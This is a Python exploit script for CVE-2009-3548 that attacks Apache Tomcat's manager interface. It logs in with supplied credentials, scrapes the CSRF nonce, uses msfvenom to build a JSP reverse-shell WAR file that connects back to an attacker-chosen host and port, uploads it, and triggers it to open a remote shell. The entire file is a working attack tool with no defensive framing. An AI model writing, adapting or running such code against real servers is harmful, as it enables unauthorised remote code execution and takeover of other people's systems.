import socket
import subprocess
import base64
import random
import requests
import lxml.html
import argparse
import string
import sys
from log_colors import *

# CVE-2009-3548
class CVE2009_3548:

    def __init__(self, url, login, passwd, lhost, lport):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.lhost, self.lport = lhost, lport
        self.login, self.passwd = login, passwd
        self.session = requests.Session()
        self.headers = {"User-Agent": "Mozilla/5.0"}

    # login basic auth
    def login_basic(self):
        print (LogColors.BLUE + "login with credentials..." + LogColors.ENDC)
        try:
            r = self.session.get(
                self.url + "/manager/html",
                auth = requests.auth.HTTPBasicAuth(self.login, self.passwd),
                headers = self.headers
            )
            if "/manager/html/deploy" in r.text:
                print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
            else:
                print (LogColors.RED + "login failed :(" + LogColors.ENDC)
                sys.exit()
        except Exception as e:
            print (LogColors.RED + "login failed :(" + LogColors.ENDC)
            sys.exit()

    # generate payload with reverse shell
    def generate_payload(self):
        print (LogColors.BLUE + "generate reverse shell payload..." + LogColors.ENDC)
        msfv = "msfvenom -p java/jsp_shell_reverse_tcp"
        msfv += " LHOST=" + lhost
        msfv += " LPORT=" + lport
        msfv += " -f war"
        msfv += " -o /tmp/hack.war"
        print (LogColors.YELLOW + msfv + LogColors.ENDC)
        try:
            p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
            p.wait()
            print (LogColors.GREEN + "reverse shell payload successfully generated :)" + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "generate payload failed :(" + LogColors.ENDC)
            sys.exit()
    
    # get csrf token
    def get_csrf_token(self):
        print (LogColors.BLUE + "get csrf token..." + LogColors.ENDC)
        r = self.session.get(self.url + "/manager/html/list", 
            auth = requests.auth.HTTPBasicAuth(self.login, self.passwd),
            headers = self.headers)
        if r.ok:
            tree = lxml.html.fromstring(r.text)
            csrf = tree.xpath(".//a[contains(@href, '?org.apache.catalina.filters.CSRF_NONCE')]/@href")
            if csrf:
                csrf = csrf[0].split("CSRF_NONCE=")[-1]
                self.csrf = csrf
                print (LogColors.YELLOW + "csrf token: " + csrf + LogColors.ENDC)
            else:
                print (LogColors.RED + "csrf not found :(" + LogColors.ENDC)
                sys.exit()
        else:
            print (LogColors.RED + "failed to parse csrf token :(" + LogColors.ENDC)
            sys.exit()

    # upload payload
    def upload_payload(self):
        upload_url = self.url + "/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=" + self.csrf
        basic_raw = "{}:{}".format(self.login, self.passwd)
        basic_encoded = base64.b64encode(basic_raw.encode()).decode("utf-8")
        
        headers = {
            "Authorization": "Basic {}".format(basic_encoded),
            "Host" : self.url.strip("http://").strip("https://").strip("/"),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Referer": self.url + "/manager/html"
        }
        files = {
            "deployWar" : ("hack.war", open("/tmp/hack.war" ,"rb"), "application/octet-stream")
        }
        try:
            r = self.session.post(upload_url, files = files, headers = headers)
        except Exception as e:
            print (LogColors.RED + "failed to upload shell..." + LogColors.ENDC)
            sys.exit()
        else:
            if r.ok:
                print (LogColors.GREEN + "successfully upload shell :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed to upload shell..." + LogColors.ENDC)
                sys.exit()

    # activate your shell
    def activate_shell(self):
        print (LogColors.BLUE + "activate shell..." + LogColors.ENDC)
        r = self.session.get(
            self.url + "/hack",
            auth = requests.auth.HTTPBasicAuth(self.login, self.passwd),
            headers = self.headers
        )
        if r.ok:
            print (LogColors.GREEN + "successfully hacked :)" + LogColors.ENDC)
            print (LogColors.GREEN + "check your netcat on " + self.lhost + " " + self.lport + LogColors.ENDC)
        else:
            print (LogColors.RED + "error when activate shell :(" + LogColors.ENDC)

    # exploit
    def exploit(self):
        self.login_basic()
        self.get_csrf_token()
        self.generate_payload()
        self.upload_payload()
        self.activate_shell()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target ip/host")
    parser.add_argument('-U','--username', required = True, help = "tomcat username")
    parser.add_argument('-P','--password', required = True, help = "tomcat password")
    parser.add_argument('-i','--lhost', required = True, help = "local host for rev sh")
    parser.add_argument('-p','--lport', required = True, help = "local port for rev sh", default = '4444')
    args = vars(parser.parse_args())
    url = args['url']
    usr, pswd = args['username'], args['password']
    lhost, lport = args['lhost'], args['lport']
    cve = CVE2009_3548(url, usr, pswd, lhost, lport)
    cve.exploit()


